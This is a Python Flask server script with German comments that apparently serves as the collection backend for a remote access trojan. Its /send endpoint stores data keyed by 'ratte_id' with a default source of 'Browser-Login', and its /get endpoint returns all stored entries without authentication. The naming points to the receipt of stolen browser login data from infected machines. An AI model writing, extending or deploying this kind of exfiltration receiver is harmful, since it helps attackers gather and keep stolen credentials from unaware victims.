# ENI & LO – Daten-Server (mit automatischer flask-Installation)

import os
import sys
import subprocess

# ============================================================
# MODULE INSTALLIEREN (immer)
# ============================================================
def install_modules():
    print("🔧 Prüfe und installiere Module...")
    modules = [
        "flask"  # WICHTIG: flask wird jetzt installiert
    ]
    for module in modules:
        print(f"📦 Installiere {module}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", module])
        print(f"✅ {module} installiert.")
    print("✅ Alle Module sind installiert.")

# ============================================================
# MODULE IMPORTIEREN
# ============================================================
try:
    from flask import Flask, request, jsonify
except ImportError as e:
    print(f"❌ Fehler beim Importieren: {e}")
    print("🔄 Installiere fehlende Module...")
    install_modules()
    from flask import Flask, request, jsonify

# ============================================================
# REST DES SERVER-CODES
# ============================================================
import json
from datetime import datetime

app = Flask(__name__)
DATA_FILE = "ratten_daten.json"

def load_data():
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

@app.route('/send', methods=['POST'])
def receive_data():
    try:
        data = request.get_json()
        ratte_id = data.get('ratte_id')
        source = data.get('source', 'Browser-Login')
        content = data.get('data')

        if not ratte_id or not content:
            return jsonify({"status": "error", "message": "Fehlende Daten"}), 400

        all_data = load_data()
        if ratte_id not in all_data:
            all_data[ratte_id] = []

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        all_data[ratte_id].append({
            "data": content,
            "timestamp": timestamp,
            "source": source
        })
        save_data(all_data)

        return jsonify({"status": "ok", "message": "Daten gespeichert"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get', methods=['GET'])
def get_data():
    data = load_data()
    return jsonify(data)

@app.route('/', methods=['GET'])
def home():
    return "🐀 ENI & LO – Daten-Server läuft."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
